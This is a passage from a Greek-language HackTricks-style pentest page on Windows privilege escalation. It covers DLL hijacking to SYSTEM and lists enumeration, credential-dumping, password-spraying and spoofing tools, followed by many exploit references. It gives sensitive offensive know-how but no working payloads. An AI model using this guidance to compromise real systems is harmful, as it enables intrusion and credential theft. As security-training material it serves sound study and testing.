Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι **πολύ πιο εύκολο να επιτευχθεί από μια διεργασία high integrity**, καθώς θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Το καλύτερο εργαλείο για την αναζήτηση vectors τοπικού privilege escalation στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Ανιχνεύτηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για πιθανές λανθασμένες ρυθμίσεις και συλλογή πληροφοριών (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Ανιχνεύτηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Δοκιμάζει τα passwords που συλλέχθηκαν σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο PowerShell ADIDNS/LLMNR/mDNS spoofing και man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική απαρίθμηση Windows για privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών ευπαθειών privesc (DEPRECATED υπέρ του Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών ευπαθειών privesc (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Απαριθμεί τον host αναζητώντας λανθασμένες ρυθμίσεις (είναι περισσότερο εργαλείο συλλογής πληροφοριών παρά privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά λογισμικά (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για λανθασμένες ρυθμίσεις (precompiled εκτελέσιμο στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές λανθασμένες ρυθμίσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτήν την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στον host του θύματος, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Βασικές αρχές κλιμάκωσης προνομίων στα Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Κλιμάκωση προνομίων μέσω εκμετάλλευσης αδύναμων δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Κλιμάκωση προνομίων στα Windows - σκονάκι](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Εργαστήριο τοπικής κλιμάκωσης προνομίων σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις στα Windows: Το AT είναι το νέο μαύρο (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Κλιμάκωση προνομίων - Windows - Ο πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Κλιμάκωση προνομίων - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός κλιμάκωσης προνομίων στα Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου κλιμάκωσης προνομίων στα Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Κλιμάκωση προνομίων στα Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι κλιμάκωσης προνομίων στα Windows για pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing μέσω μακροεντολής Word VBA και SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για πρόσβαση SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak μέσω format string + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Κυνηγώντας την Ασημένια Αλεπού: γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιούχου συστήματος αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία δοκιμής συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Επιστροφή στο παρελθόν: Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (μεταφορά του Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Επικίνδυνη επίλυση λειτουργικών μονάδων στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Λειτουργικές μονάδες Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις λίστας ελέγχου C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Κατάληψη δυαδικών αρχείων υπηρεσιών](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με τη Microslop: Συνδυασμός CLDFLT και συνθηκών ανταγωνισμού του πυρήνα DirectX για τοπική κλιμάκωση προνομίων στα Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τα κυβερνά όλα: Πρωτογενές exploit πλήρους ανάγνωσης/εγγραφής στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για κλιμάκωση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Κώδικας exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, Μέρος 2: CVE-2020-1013, ευπάθεια 1-day τοπικής κλιμάκωσης προνομίων στα Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερευνώντας τη Διαχείριση διαπιστευτηρίων και το Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC για το CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Αντιπροσωπεία Kerberos βάσει πόρων με περιορισμούς: Όταν μια αλλαγή εικόνας οδηγεί σε κλιμάκωση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από τον SSH agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
